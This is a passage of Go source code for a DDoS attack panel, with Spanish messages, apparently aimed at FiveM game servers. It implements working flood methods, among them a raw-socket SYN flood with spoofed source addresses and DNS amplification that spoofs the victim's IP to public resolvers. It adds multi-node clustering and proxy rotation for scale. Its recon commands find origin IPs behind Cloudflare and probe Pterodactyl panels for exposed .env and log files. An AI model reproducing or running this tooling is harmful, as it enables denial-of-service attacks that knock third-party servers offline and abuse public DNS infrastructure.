			case "getstatus":
				getStatusFlood(target, port, duration, stats, stopChan)
			case "timeout":
				timeoutFlood(target, port, duration, stats, stopChan)
			case "bypass":
				bypassFlood(target, port, duration, stats, stopChan)
			case "tcpflood":
				tcpfloodFlood(target, port, duration, stats, stopChan)
            case "synflood":
                synFlood(target, port, duration, stats, stopChan)
            case "dnsamp":
                dnsAmpFlood(target, port, duration, stats, stopChan)
            case "nginx":
                nginxFlood(target, port, duration, stats, stopChan)
            case "all":
                methods := []string{"udp", "tcp", "query", "info", "rcon", "http", "connect", "getstatus", "timeout", "bypass", "tcpflood", "synflood", "dnsamp", "nginx"}
				for {
					for _, m := range methods {
						if !att.Running {
							return
						}
						switch m {
						case "udp":
							udpFlood(target, port, 1, stats, stopChan)
						case "tcp":
							tcpFlood(target, port, 1, stats, stopChan)
						case "query":
							queryFlood(target, port, 1, stats, stopChan)
						case "info":
							infoFlood(target, port, 1, stats, stopChan)
						case "rcon":
							rconBruteforce(target, port, 1, stats, stopChan)
						case "http":
							httpFlood(target, port, 1, stats, stopChan)
						case "connect":
							connectFlood(target, port, 1, stats, stopChan)
						case "getstatus":
							getStatusFlood(target, port, 1, stats, stopChan)
						case "timeout":
							timeoutFlood(target, port, 1, stats, stopChan)
						case "bypass":
							bypassFlood(target, port, 1, stats, stopChan)
						case "tcpflood":
							tcpfloodFlood(target, port, 1, stats, stopChan)
						case "synflood":
							synFlood(target, port, 1, stats, stopChan)
                        case "dnsamp":
                            dnsAmpFlood(target, port, 1, stats, stopChan)
                        case "nginx":
                            nginxFlood(target, port, 1, stats, stopChan)
                        }
					}
				}
			}
		}()
	}

	go func() {
		time.Sleep(time.Duration(duration) * time.Second)
		att.Running = false
		close(stopChan)
		logMsg(fmt.Sprintf("ATAQUE %d FINALIZADO: %d paquetes enviados", id, stats.Sent))
	}()

	return fmt.Sprintf("[+] Ataque %d iniciado contra %s:%d (%s) por %ds", id, target, port, method, duration)
}

func tcpfloodFlood(target string, port int, duration int, stats *AttackStats, stopChan chan bool) {
	addr := fmt.Sprintf("%s:%d", target, port)
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	payload := make([]byte, 1024)
	for i := range payload {
		payload[i] = 0xFF
	}

	const connsPerThread = 3
	var connsMu sync.Mutex
	var conns [connsPerThread]net.Conn
	var active [connsPerThread]bool

	// Open initial connections
	for i := 0; i < connsPerThread; i++ {
		conn, err := dialWithProxy(addr)
		if err == nil {
			conns[i] = conn
			active[i] = true
		}
	}

	defer func() {
		for i := 0; i < connsPerThread; i++ {
			if active[i] {
				conns[i].Close()
			}
		}
	}()

	for time.Now().Before(endTime) {
		select {
		case <-stopChan:
			return
		default:
		}
		for i := 0; i < connsPerThread; i++ {
			if !active[i] {
				conn, err := dialWithProxy(addr)
				if err != nil {
					stats.Errors++
					continue
				}
				connsMu.Lock()
				conns[i] = conn
				active[i] = true
				connsMu.Unlock()
			}
			conns[i].SetWriteDeadline(time.Now().Add(200 * time.Millisecond))
			_, err := conns[i].Write(payload)
			if err != nil {
				conns[i].Close()
				active[i] = false
				stats.Errors++
			} else {
				stats.Sent++
			}
		}
	}
}

func synFlood(target string, port int, duration int, stats *AttackStats, stopChan chan bool) {
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	targetIP := net.ParseIP(target)
	if targetIP == nil {
		stats.Errors++
		return
	}
	targetAddr := &syscall.SockaddrInet4{Port: port}
	copy(targetAddr.Addr[:], targetIP.To4())

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		stats.Errors++
		return
	}
	defer syscall.Close(fd)
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	rng := mrand.New(mrand.NewSource(time.Now().UnixNano()))
	for time.Now().Before(endTime) {
		select {
		case <-stopChan:
			return
		default:
		}
		srcIP := net.IPv4(byte(rng.Intn(223)+1), byte(rng.Intn(255)), byte(rng.Intn(255)), byte(rng.Intn(253)+1))
		srcPort := uint16(rng.Intn(55535) + 10000)
		seq := uint32(rng.Uint32())

		totalLen := 20 + 20
		pkt := make([]byte, totalLen)

		pkt[0] = 0x45
		pkt[1] = 0
		binary.BigEndian.PutUint16(pkt[2:], uint16(totalLen))
		binary.BigEndian.PutUint16(pkt[4:], uint16(rng.Intn(65535)))
		pkt[6] = 0x40
		pkt[7] = 0
		pkt[8] = 64
		pkt[9] = 6
		copy(pkt[12:16], srcIP.To4())
		copy(pkt[16:20], targetIP.To4())
		ipChecksum := checksum(pkt[:20])
		binary.BigEndian.PutUint16(pkt[10:], ipChecksum)

		tcp := pkt[20:]
		binary.BigEndian.PutUint16(tcp[0:], srcPort)
		binary.BigEndian.PutUint16(tcp[2:], uint16(port))
		binary.BigEndian.PutUint32(tcp[4:], seq)
		binary.BigEndian.PutUint32(tcp[8:], 0)
		tcp[12] = 0x50
		tcp[13] = 0x02
		binary.BigEndian.PutUint16(tcp[14:], 65535)
		binary.BigEndian.PutUint16(tcp[16:], 0)
		binary.BigEndian.PutUint16(tcp[18:], 0)

		pseudo := make([]byte, 12)
		copy(pseudo[0:4], srcIP.To4())
		copy(pseudo[4:8], targetIP.To4())
		pseudo[9] = 6
		binary.BigEndian.PutUint16(pseudo[10:], 20)
		pseudoHdr := append(pseudo, tcp...)
		tcpChecksum := checksum(pseudoHdr)
		binary.BigEndian.PutUint16(tcp[16:], tcpChecksum)

		err := syscall.Sendto(fd, pkt, 0, targetAddr)
		if err != nil {
			stats.Errors++
		} else {
			stats.Sent++
		}
	}
}

var dnsResolvers = []string{
	"8.8.8.8:53", "8.8.4.4:53", "1.1.1.1:53", "1.0.0.1:53",
	"9.9.9.9:53", "208.67.222.222:53", "208.67.220.220:53",
	"64.6.64.6:53", "64.6.65.6:53", "84.200.69.80:53",
	"84.200.70.40:53", "8.26.56.26:53", "8.20.247.20:53",
	"156.154.70.1:53", "156.154.71.1:53",
}

func dnsAmpFlood(target string, port int, duration int, stats *AttackStats, stopChan chan bool) {
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	targetUDP := &syscall.SockaddrInet4{Port: port}
	copy(targetUDP.Addr[:], net.ParseIP(target).To4())

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		stats.Errors++
		return
	}
	defer syscall.Close(fd)
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	rng := mrand.New(mrand.NewSource(time.Now().UnixNano()))
	domains := []string{"google.com", "cloudflare.com", "youtube.com", "facebook.com", "amazon.com"}
	dIdx := 0
	rIdx := 0

	for time.Now().Before(endTime) {
		select {
		case <-stopChan:
			return
		default:
		}
		domain := domains[dIdx%len(domains)]
		dIdx++

		query := buildDNSQuery(domain, rng)
		resolver := dnsResolvers[rIdx%len(dnsResolvers)]
		rIdx++

		resolverIP := net.ParseIP(strings.Split(resolver, ":")[0])
		rPort, _ := strconv.Atoi(strings.Split(resolver, ":")[1])

		srcPort := uint16(rng.Intn(55535) + 10000)

		totalLen := 20 + 8 + len(query)
		pkt := make([]byte, totalLen)

		pkt[0] = 0x45
		pkt[1] = 0
		binary.BigEndian.PutUint16(pkt[2:], uint16(totalLen))
		binary.BigEndian.PutUint16(pkt[4:], uint16(rng.Intn(65535)))
		pkt[6] = 0x40
		pkt[7] = 0
		pkt[8] = 64
		pkt[9] = 17
		copy(pkt[12:16], net.ParseIP(target).To4()) // spoofed source = target
		copy(pkt[16:20], resolverIP.To4())
		ipChk := checksum(pkt[:20])
		binary.BigEndian.PutUint16(pkt[10:], ipChk)

		udp := pkt[20:]
		binary.BigEndian.PutUint16(udp[0:], srcPort)
		binary.BigEndian.PutUint16(udp[2:], uint16(rPort))
		binary.BigEndian.PutUint16(udp[4:], uint16(8+len(query)))
		binary.BigEndian.PutUint16(udp[6:], 0)
		copy(udp[8:], query)

		resolverAddr := &syscall.SockaddrInet4{Port: rPort}
		copy(resolverAddr.Addr[:], resolverIP.To4())
		err := syscall.Sendto(fd, pkt, 0, resolverAddr)
		if err != nil {
			stats.Errors++
		} else {
			stats.Sent++
		}
	}
}

func buildDNSQuery(domain string, rng *mrand.Rand) []byte {
	id := uint16(rng.Intn(65535))
	q := make([]byte, 12)
	binary.BigEndian.PutUint16(q[0:], id)
	q[2] = 0x01
	q[5] = 0x01
	for _, part := range strings.Split(domain, ".") {
		q = append(q, byte(len(part)))
		q = append(q, []byte(part)...)
	}
	q = append(q, 0x00)
	q = append(q, 0x00, 0xFF)
	q = append(q, 0x00, 0x01)
	return q
}

func stopAttack(id int) string {
	attackMu.Lock()
	att, exists := attackList[id]
	attackMu.Unlock()

	if !exists {
		return "[!] Ataque no encontrado"
	}

	att.Running = false
	return fmt.Sprintf("[!] Ataque %d detenido", id)
}

func listAttacks() string {
	attackMu.Lock()
	defer attackMu.Unlock()

	if len(attackList) == 0 {
		return "[!] No hay ataques activos"
	}

	result := "ATAQUES ACTIVOS:\r\n"
	result += "ID  | Target      | Puerto | Metodo | Hilos | Duracion | Enviados | Errores | PPS    | Estado\r\n"
	result += "----|-------------|--------|--------|-------|----------|----------|---------|--------|--------\r\n"
	now := time.Now()
	for id, att := range attackList {
		status := "ACTIVO"
		if !att.Running {
			status = "DETENIDO"
		}
		elapsed := now.Sub(att.Start).Seconds()
		var pps int64
		if elapsed > 0 {
			pps = int64(float64(att.Stats.Sent) / elapsed)
		}
		result += fmt.Sprintf("%-4d| %-11s| %-6d| %-6s| %-5d| %-8d| %-8d| %-7d| %-6d| %s\r\n",
			id, att.Target, att.Port, att.Method, att.Threads, att.Duration, att.Stats.Sent, att.Stats.Errors, pps, status)
	}
	return result
}

func ejecutarSistema(cmd string) string {
	if cmd == "" {
		return ""
	}

	lower := strings.ToLower(cmd)

	if lower == "help" {
		return `
COMANDOS:

  attack <IP> <puerto> <metodo> <hilos> <duracion>  - Iniciar ataque
  stop <id>                                         - Detener ataque
  status                                            - Ver ataques activos

METODOS: udp, tcp, query, info, rcon, http, connect, getstatus, timeout, bypass, tcpflood, synflood, dnsamp, nginx, all

EJEMPLOS:
  attack 192.168.1.100 30120 udp 100 30
  attack 192.168.1.100 30120 all 200 60

SISTEMA: whoami, uptime, ls, ps, netstat, clear, exit, reloadusers, adduser, deluser, paping

PROXIES: proxyload, proxystatus, proxyon, proxyoff

CLUSTER: nodes, link <IP:port>, unlink <IP:port>

RECON: recon, portscan, udpscan, geoip, dns, shodan, whois, subenum, bypasscf, wafdetect, asnlookup, httphead, ptprobe, fiveminfo, wingprobe, cfxsearch, subscan, techdetect
`
	}

    if lower == "clear" {
        return "\r\n\r\n\r\n\r\n\r\n"
    }

    if strings.HasPrefix(lower, "paping ") {
        parts := strings.Fields(cmd)
        if len(parts) < 3 {
            return "[!] Uso: paping <IP> <puerto> [pings]"
        }
        target := parts[1]
        port, err := strconv.Atoi(parts[2])
        if err != nil {
            return "[!] Puerto invalido"
        }
        count := 10
        if len(parts) >= 4 {
            c, err := strconv.Atoi(parts[3])
            if err == nil && c > 0 {
                count = c
            }
        }
        var results []string
        results = append(results, fmt.Sprintf("[+] TCP Ping %s:%d - %d pings", target, port, count))
        for i := 0; i < count; i++ {
            start := time.Now()
            conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), 2*time.Second)
            if err != nil {
                results = append(results, fmt.Sprintf("  ping %d: %s", i+1, err))
                continue
            }
            conn.Close()
            ms := time.Since(start).Milliseconds()
            results = append(results, fmt.Sprintf("  ping %d: response time = %d ms", i+1, ms))
        }
        return strings.Join(results, "\r\n")
    }

	if lower == "reloadusers" {
		userList, err := listUsers()
		if err != nil {
			return fmt.Sprintf("[!] Error: %v", err)
		}
		return fmt.Sprintf("[+] Usuarios: %d (%s)", len(userList), strings.Join(userList, ", "))
	}

	if strings.HasPrefix(lower, "adduser ") {
		parts := strings.Fields(cmd)
		if len(parts) < 3 {
			return "[!] Uso: adduser <usuario> <password>"
		}
		if err := addUser(parts[1], parts[2]); err != nil {
			return fmt.Sprintf("[!] Error: %v", err)
		}
		return fmt.Sprintf("[+] Usuario %s creado (SHA256+salt)", parts[1])
	}

	if strings.HasPrefix(lower, "deluser ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: deluser <usuario>"
		}
		res, _ := db.Exec("DELETE FROM users WHERE username = ?", parts[1])
		n, _ := res.RowsAffected()
		if n == 0 {
			return fmt.Sprintf("[-] Usuario %s no encontrado", parts[1])
		}
		return fmt.Sprintf("[-] Usuario %s eliminado", parts[1])
	}

	if strings.HasPrefix(lower, "setrole ") {
		parts := strings.Fields(cmd)
		if len(parts) < 3 {
			return "[!] Uso: setrole <usuario> <owner|admin|user>"
		}
		role := strings.ToLower(parts[2])
		if role != "owner" && role != "admin" && role != "user" {
			return "[!] Rol invalido. Usa: owner, admin, user"
		}
		_, err := db.Exec("UPDATE users SET role = ? WHERE username = ?", role, parts[1])
		if err != nil {
			return fmt.Sprintf("[!] Error: %v", err)
		}
		return fmt.Sprintf("[+] Rol de %s actualizado a %s", parts[1], role)
	}

	if lower == "whoami" {
		out, _ := exec.Command("whoami").Output()
		return string(out)
	}

	if lower == "uptime" {
		out, _ := exec.Command("uptime").Output()
		return string(out)
	}

	if lower == "netstat" {
		out, _ := exec.Command("sh", "-c", "netstat -tulpn 2>/dev/null || ss -tulpn").Output()
		return string(out)
	}

	if lower == "ps" {
		out, _ := exec.Command("sh", "-c", "ps aux --no-headers 2>/dev/null || ps aux").Output()
		return string(out)
	}

	if lower == "status" {
		return listAttacks()
	}

	if lower == "proxyload" {
		go func() {
			fetchProxies()
			validateProxies()
		}()
		return "[+] Descargando y validando proxies..."
	}

	if lower == "proxystatus" || lower == "proxystat" {
		proxyMu.RLock()
		count := len(proxyList)
		active := useProxies
		proxyMu.RUnlock()
		proxyProgMu.Lock()
		st := proxyStatus
		done := proxyDone
		proxyProgMu.Unlock()
		status := "IDLE"
		if !done {
			status = "LOADING"
		}
		return fmt.Sprintf("[+] Proxies: %d | Rotacion: %v | Estado: %s\r\n%s", count, active, status, st)
	}

	if lower == "proxyon" {
		useProxies = true
		return "[+] Rotacion de proxies ACTIVADA"
	}

	if lower == "proxyoff" {
		useProxies = false
		return "[-] Rotacion de proxies DESACTIVADA"
	}

	if lower == "nodes" {
		nodesMu.Lock()
		defer nodesMu.Unlock()
		if len(nodes) == 0 {
			return "[-] No hay nodos conectados"
		}
		var list []string
		for addr := range nodes {
			list = append(list, addr)
		}
		return fmt.Sprintf("[+] Nodos (%d):\r\n%s\r\nTotal VPS: %d | Poder combinado: ~%dM PPS",
			len(nodes), strings.Join(list, "\r\n"), len(nodes)+1, (len(nodes)+1)*1)
	}

    if strings.HasPrefix(lower, "link ") {
        parts := strings.Fields(cmd)
        if len(parts) < 2 {
            return "[!] Uso: link <IP:puerto>"
        }
        addr := parts[1]
        if !strings.Contains(addr, ":") {
            addr += ":3334"
        }
        // Save for auto-reconnect
        nodesMu.Lock()
        var list []string
        if data, err := os.ReadFile(nodesFile); err == nil {
            list = strings.Split(strings.TrimSpace(string(data)), "\n")
        }
        found := false
        for _, n := range list {
            if n == addr { found = true }
        }
        if !found {
            list = append(list, addr)
            os.WriteFile(nodesFile, []byte(strings.Join(list, "\n")), 0644)
        }
        nodesMu.Unlock()

        conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            return fmt.Sprintf("[!] No se pudo conectar a %s: %v", addr, err)
        }
        nodesMu.Lock()
        nodes[addr] = conn
        nodesMu.Unlock()
        go handleNode(conn, addr)
        return fmt.Sprintf("[+] Nodo %s vinculado (persistente)", addr)
    }

	if strings.HasPrefix(lower, "unlink ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: unlink <IP:puerto>"
		}
		addr := parts[1]
		if !strings.Contains(addr, ":") {
			addr += ":3334"
		}
		nodesMu.Lock()
		if conn, ok := nodes[addr]; ok {
			conn.Close()
			delete(nodes, addr)
		}
		nodesMu.Unlock()
		return fmt.Sprintf("[-] Nodo %s desvinculado", addr)
	}

	if lower == "recon" {
		return `
RECON:
  portscan <IP> [puertos]   - Escaneo TCP de puertos
  udpscan <IP> [puertos]   - Escaneo UDP de puertos
  geoip <IP>               - Geolocalizacion de IP
  dns <dominio/IP>         - DNS lookup / Reverse DNS
  shodan <IP>              - Info de Shodan (puertos, hostnames)
  whois <IP>               - WHOIS del IP/ASN
  subenum <dominio>        - Enumerar subdominios (crt.sh)
  bypasscf <dominio>       - Buscar IP real detras de Cloudflare
  wafdetect <URL>          - Detectar WAF/CDN
  asnlookup <ASN>          - Rangos de IP de un ASN
  httphead <URL>           - Headers HTTP de un servidor
  ptprobe <panel_url>      - Probar panel Pterodactyl (endpoints, version, leaks)
  fiveminfo <IP:puerto>    - Extraer info via getinfo/getstatus + cfx.re
  wingprobe <IP>           - Buscar Wings daemon en puertos comunes
  cfxsearch <termino>      - Buscar servidores en cfx.re
  cfbypass <IP>            - Encontrar endpoint real FiveM (bypass Spectrum)
  subscan <dominio>        - Escaneo DNS de subdominios comunes
  techdetect <URL>         - Detectar tecnologias (stack fingerprinting)
`
	}

	if strings.HasPrefix(lower, "portscan ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: portscan <IP> [puertos]"
		}
		target := parts[1]
		ports := "22,80,443,8080,8443,3389,30120,30121,3306,5432,6379,27017,21,25,53,110,143,993,995"
		if len(parts) >= 3 {
			ports = parts[2]
		}
		var results []string
		var wg sync.WaitGroup
		var mu sync.Mutex
		portList := strings.Split(ports, ",")
		sem := make(chan struct{}, 50)
		for _, p := range portList {
			wg.Add(1)
			go func(portStr string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()
				portStr = strings.TrimSpace(portStr)
				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", target, portStr), 3*time.Second)
				if err == nil {
					conn.Close()
					mu.Lock()
					results = append(results, fmt.Sprintf("[OPEN] TCP %s", portStr))
					mu.Unlock()
				}
			}(p)
		}
		wg.Wait()
		if len(results) == 0 {
			return fmt.Sprintf("[-] No se encontraron puertos abiertos en %s", target)
		}
		return fmt.Sprintf("[+] %s - Puertos abiertos:\r\n%s", target, strings.Join(results, "\r\n"))
	}

	if strings.HasPrefix(lower, "udpscan ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: udpscan <IP> [puertos]"
		}
		target := parts[1]
		ports := "30120,53,123,161"
		if len(parts) >= 3 {
			ports = parts[2]
		}
		var results []string
		for _, p := range strings.Split(ports, ",") {
			p = strings.TrimSpace(p)
			conn, err := net.DialTimeout("udp", fmt.Sprintf("%s:%s", target, p), 2*time.Second)
			if err == nil {
				conn.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF, 0x67, 0x65, 0x74, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73})
				buf := make([]byte, 256)
				conn.SetReadDeadline(time.Now().Add(2 * time.Second))
				n, _ := conn.Read(buf)
				conn.Close()
				if n > 0 {
					results = append(results, fmt.Sprintf("[OPEN] UDP %s (%d bytes response)", p, n))
				} else {
					results = append(results, fmt.Sprintf("[OPEN?] UDP %s (no response)", p))
				}
			}
		}
		if len(results) == 0 {
			return fmt.Sprintf("[-] No se encontraron puertos UDP abiertos en %s", target)
		}
		return fmt.Sprintf("[+] %s - Puertos UDP:\r\n%s", target, strings.Join(results, "\r\n"))
	}

	if strings.HasPrefix(lower, "geoip ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: geoip <IP>"
		}
		resp, err := httpGet(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,as,asname", parts[1]))
		if err != nil {
			return fmt.Sprintf("[!] Error: %v", err)
		}
		return resp
	}

	if strings.HasPrefix(lower, "shodan ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: shodan <IP>"
		}
		resp, err := httpGet(fmt.Sprintf("https://internetdb.shodan.io/%s", parts[1]))
		if err != nil {
			return fmt.Sprintf("[!] Error: %v", err)
		}
		if strings.Contains(resp, "No information") {
			resp2, err2 := httpGet(fmt.Sprintf("https://search.censys.io/api/_search?q=ip:%s", parts[1]))
			if err2 == nil && !strings.Contains(resp2, "error") && len(resp2) > 50 {
				if len(resp2) > 1000 {
					resp2 = resp2[:1000]
				}
				return fmt.Sprintf("[+] Shodan: sin datos. Censys:\r\n%s", resp2)
			}
			return fmt.Sprintf("[-] %s no esta indexado en Shodan ni Censys", parts[1])
		}
		return fmt.Sprintf("[+] Shodan %s:\r\n%s", parts[1], resp)
	}

	if strings.HasPrefix(lower, "whois ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: whois <IP>"
		}
		out, _ := exec.Command("sh", "-c", fmt.Sprintf("whois %s 2>/dev/null | grep -iE 'org-name|descr|netname|country|origin|inetnum|role|address|mnt-by|remarks' | head -20", parts[1])).Output()
		if len(out) == 0 {
			return "[!] Sin resultados WHOIS"
		}
		return fmt.Sprintf("[+] WHOIS %s:\r\n%s", parts[1], string(out))
	}

	if strings.HasPrefix(lower, "asnlookup ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: asnlookup <ASN> (ej: AS214987)"
		}
		asn := strings.TrimPrefix(strings.ToUpper(parts[1]), "AS")
		resp, err := httpGet(fmt.Sprintf("https://api.bgpview.io/asn/%s/prefixes", asn))
		if err != nil {
			return fmt.Sprintf("[!] Error: %v", err)
		}
		return fmt.Sprintf("[+] Rangos %s:\r\n%s", parts[1], resp)
	}

	if strings.HasPrefix(lower, "dns ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: dns <dominio/IP>"
		}
		target := parts[1]
		var results []string
		if net.ParseIP(target) != nil {
			names, _ := net.LookupAddr(target)
			if len(names) > 0 {
				results = append(results, fmt.Sprintf("PTR: %s", strings.Join(names, ", ")))
			} else {
				results = append(results, "[-] No PTR record")
			}
		} else {
			ips, _ := net.LookupIP(target)
			for _, ip := range ips {
				results = append(results, fmt.Sprintf("A: %s", ip.String()))
			}
			mx, _ := net.LookupMX(target)
			for _, m := range mx {
				results = append(results, fmt.Sprintf("MX: %s (pref:%d)", m.Host, m.Pref))
			}
			ns, _ := net.LookupNS(target)
			for _, n := range ns {
				results = append(results, fmt.Sprintf("NS: %s", n.Host))
			}
		}
		return fmt.Sprintf("[+] DNS %s:\r\n%s", target, strings.Join(results, "\r\n"))
	}

	if strings.HasPrefix(lower, "subenum ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: subenum <dominio>"
		}
		domain := parts[1]
		resp, err := httpGet(fmt.Sprintf("https://crt.sh/?q=%s&output=json", domain))
		if err != nil {
			return fmt.Sprintf("[!] Error: %v", err)
		}
		return fmt.Sprintf("[+] Subdominios %s (crt.sh):\r\n%s", domain, resp)
	}

	if strings.HasPrefix(lower, "bypasscf ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: bypasscf <dominio>"
		}
		domain := parts[1]
		var results []string
		results = append(results, "[*] Buscando IP real...")

		resp, _ := httpGet(fmt.Sprintf("https://dnsdumpster.com/"))
		_ = resp

		resp2, err := httpGet(fmt.Sprintf("https://archive.org/wayback/available?url=%s", domain))
		if err == nil {
			results = append(results, fmt.Sprintf("Wayback: %s", resp2[:min(200, len(resp2))]))
		}
		resp3, err := httpGet(fmt.Sprintf("https://crt.sh/?q=%s&output=json", domain))
		if err == nil {
			results = append(results, fmt.Sprintf("Certs: %s", resp3[:min(300, len(resp3))]))
		}
		out, _ := exec.Command("sh", "-c", fmt.Sprintf("dig +short %s A 2>/dev/null; dig +short %s MX 2>/dev/null", domain, domain)).Output()
		if len(out) > 0 && string(out) != "\n" {
			results = append(results, fmt.Sprintf("DNS Records:\r\n%s", string(out)))
		}

		return fmt.Sprintf("[+] Cloudflare Bypass - %s:\r\n%s", domain, strings.Join(results, "\r\n"))
	}

	if strings.HasPrefix(lower, "wafdetect ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: wafdetect <URL>"
		}
		url := parts[1]
		if !strings.HasPrefix(url, "http") {
			url = "http://" + url
		}
		resp, err := httpGet(url)
		if err != nil {
			return fmt.Sprintf("[!] Error conectando: %v", err)
		}
		var detections []string
		respLower := strings.ToLower(resp)
		if strings.Contains(respLower, "cloudflare") {
			detections = append(detections, "[DETECTED] Cloudflare")
		}
		if strings.Contains(respLower, "sucuri") {
			detections = append(detections, "[DETECTED] Sucuri")
		}
		if strings.Contains(respLower, "akamai") {
			detections = append(detections, "[DETECTED] Akamai")
		}
		if strings.Contains(respLower, "incapsula") || strings.Contains(respLower, "imperva") {
			detections = append(detections, "[DETECTED] Imperva/Incapsula")
		}
		if strings.Contains(respLower, "f5") || strings.Contains(respLower, "big-ip") {
			detections = append(detections, "[DETECTED] F5 BIG-IP")
		}
		if strings.Contains(respLower, "aws") || strings.Contains(respLower, "cloudfront") {
			detections = append(detections, "[DETECTED] AWS CloudFront")
		}
		if len(detections) == 0 {
			detections = append(detections, "[*] No WAF/CDN detected")
		}
		return fmt.Sprintf("[+] WAF Detect %s:\r\n%s", url, strings.Join(detections, "\r\n"))
	}

	if strings.HasPrefix(lower, "httphead ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: httphead <URL>"
		}
		url := parts[1]
		if !strings.HasPrefix(url, "http") {
			url = "http://" + url
		}
		resp, err := httpGet(url)
		if err != nil {
			return fmt.Sprintf("[!] Error: %v", err)
		}
		return fmt.Sprintf("[+] HTTP Headers %s:\r\n%s", url, resp)
	}

	if strings.HasPrefix(lower, "ptprobe ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: ptprobe <panel_url> (ej: https://panel.dominio.com)"
		}
		url := strings.TrimRight(parts[1], "/")
		var results []string

		results = append(results, "[*] Probing Pterodactyl panel...")

		resp, err := httpGet(url + "/auth/login")
		if err != nil {
			return fmt.Sprintf("[!] Error: %v", err)
		}

		if strings.Contains(resp, "pterodactyl") || strings.Contains(resp, "Pterodactyl") {
			results = append(results, "[+] Pterodactyl DETECTED")
		} else if strings.Contains(resp, "csrf-token") || strings.Contains(resp, "XSRF-TOKEN") {
			results = append(results, "[+] Laravel detected (likely Pterodactyl)")
		} else if strings.Contains(resp, "VibeGAMES") {
			results = append(results, "[+] VibeGAMES custom panel (Pterodactyl-based)")
		}

		hresp, _ := httpGet(url + "/")
		headers := extractHeaders(hresp)

		for _, ep := range []string{"/api", "/api/application/users", "/api/client", "/api/client/account", "/version", "/.env", "/storage/logs/laravel.log", "/robots.txt"} {
			code, _ := httpCode(url + ep)
			if code == 200 {
				results = append(results, fmt.Sprintf("[OPEN] %s (200)", ep))
			} else if code == 403 {
				results = append(results, fmt.Sprintf("[AUTH] %s (403 - requires login)", ep))
			} else if code == 302 || code == 301 {
				results = append(results, fmt.Sprintf("[REDIR] %s (%d)", ep, code))
			}
		}

		if strings.Contains(headers, "cloudflare") || strings.Contains(headers, "cf-ray") {
			results = append(results, "[!] Protected by Cloudflare")
		}

		results = append(results, fmt.Sprintf("[*] Headers: %s", headers))
		return fmt.Sprintf("[+] Pterodactyl Probe - %s:\r\n%s", url, strings.Join(results, "\r\n"))
	}

    if strings.HasPrefix(lower, "fiveminfo ") || strings.HasPrefix(lower, "cfbypass ") {
        parts := strings.Fields(cmd)
        if len(parts) < 2 {
            return "[!] Uso: fiveminfo <IP:puerto> | cfbypass <IP>"
        }
        isBypass := strings.HasPrefix(lower, "cfbypass ")
        target := parts[1]

        var results []string

        // cfbypass mode: scan multiple FiveM endpoints to find the real origin
        if isBypass {
            results = append(results, fmt.Sprintf("[*] Buscando endpoint real de FiveM en %s...", target))
            ports := []int{30120, 30121, 30122, 30130, 30160, 30166, 30180, 30200, 30202, 30203, 30204, 40120, 40130}
            for _, p := range ports {
                conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, p), 2*time.Second)
                if err == nil {
                    conn.Close()
                    results = append(results, fmt.Sprintf("[TCP OPEN] %s:%d", target, p))
                    // Probe getstatus via UDP on same port
                    uconn, err := net.DialTimeout("udp", fmt.Sprintf("%s:%d", target, p), 2*time.Second)
                    if err == nil {
                        uconn.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF, 0x67, 0x65, 0x74, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73})
                        uconn.SetReadDeadline(time.Now().Add(2 * time.Second))
                        buf := make([]byte, 2048)
                        n, err := uconn.Read(buf)
                        uconn.Close()
                        if err == nil && n > 5 {
                            results = append(results, fmt.Sprintf("[FIVEM FOUND] %s:%d -> %d bytes (ORIGEN REAL)", target, p, n))
                        }
                    }
                }
            }
            return strings.Join(results, "\r\n")
        }

        if !strings.Contains(target, ":") {
            target += ":30120"
        }
        host, portStr, _ := net.SplitHostPort(target)
        port, _ := strconv.Atoi(portStr)

        conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(host), Port: port})
		if err != nil {
			results = append(results, fmt.Sprintf("[-] UDP connect failed: %v", err))
		} else {
			defer conn.Close()
			conn.SetDeadline(time.Now().Add(3 * time.Second))

			conn.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF, 0x67, 0x65, 0x74, 0x69, 0x6E, 0x66, 0x6F, 0x20, 0x78, 0x78, 0x78, 0x00})
			buf := make([]byte, 2048)
			n, err := conn.Read(buf)
			if err != nil {
				results = append(results, fmt.Sprintf("[-] getinfo: %v", err))
			} else if n > 5 {
